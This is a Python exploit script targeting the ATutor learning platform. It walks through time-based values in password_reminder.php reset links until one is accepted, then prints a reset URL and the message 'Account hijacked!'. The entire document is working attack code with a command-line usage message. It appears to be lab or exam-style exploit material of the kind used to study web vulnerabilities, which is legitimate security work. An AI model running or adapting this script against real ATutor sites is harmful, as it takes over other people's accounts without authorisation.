import hashlib, string, itertools, re, sys, requests, subprocess
from bs4 import BeautifulSoup

def gen_code(id, url):
    now = subprocess.run(["php -r 'echo intval(((time()/60)/60)/24);'"], stdout=subprocess.PIPE, text=True, shell=True)
    now_int = int(now.stdout)
    for num in itertools.count(start=now_int, step=1):
        full_url = f"{url}/ATutor/password_reminder.php?id=1&g={num}&h=0"
        r = requests.get(full_url)
        print(f'[-] Issuing update request to URL: {full_url}')
        if "The link is either invalid or expired." not in r.text:
            return (True, full_url)


def main():
    if len(sys.argv) != 3:
        print(f'[!] usage: %s <id> <atutor_url>' % sys.argv[0])
        print(f'[!] eg: %s 1 http://atutor-server.com' % sys.argv[0])
        sys.exit(2)

    id = sys.argv[1]
    url = sys.argv[2]
    result, full_url = gen_code(id, url)
    if(result):
        print(f"[+] Account hijacked!  Reset the password at {full_url}")
    else:
        print("[!] Attack failed -- exiting...")
        sys.exit(2)
    

if __name__ == "__main__":
    main()